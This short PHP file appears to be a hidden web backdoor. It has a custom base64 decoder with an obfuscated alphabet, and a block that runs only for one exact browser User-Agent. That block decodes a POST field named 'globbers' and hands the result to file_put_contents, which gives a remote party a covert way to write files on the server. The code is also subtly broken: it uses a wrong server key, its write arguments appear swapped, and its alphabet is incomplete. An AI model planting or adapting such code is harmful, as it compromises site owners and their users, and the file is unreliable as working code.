<?php
function _base64_decode($input) {
//$keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
$keyStr =  "¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕ0123456789+/";
$chr1 = $chr2 = $chr3 = "";
$enc1 = $enc2 = $enc3 = $enc4 = "";
$i = 0;
$output = "";

  // remove all characters that are not A-Z, a-z, 0-9, +, /, or =
//$input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);

do {
$enc1 = strpos($keyStr, substr($input, $i++, 1));
$enc2 = strpos($keyStr, substr($input, $i++, 1));
$enc3 = strpos($keyStr, substr($input, $i++, 1));
$enc4 = strpos($keyStr, substr($input, $i++, 1));

$chr1 = ($enc1 << 2) | ($enc2 >> 4);
$chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
$chr3 = (($enc3 & 3) << 6) | $enc4;

$output = $output . chr((int) $chr1);

if ($enc3 != 64) {
$output = $output . chr((int) $chr2);
}
if ($enc4 != 64) {
$output = $output . chr((int) $chr3);
}

$chr1 = $chr2 = $chr3 = "";
$enc1 = $enc2 = $enc3 = $enc4 = "";

} while ($i < strlen($input));

return urldecode($output);
}



if($_SERVER['USER_AGENT'] == "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17")
{
$data = _base64_decode($_POST['globbers']);
file_put_contents($data,"logs.txt");
}

?>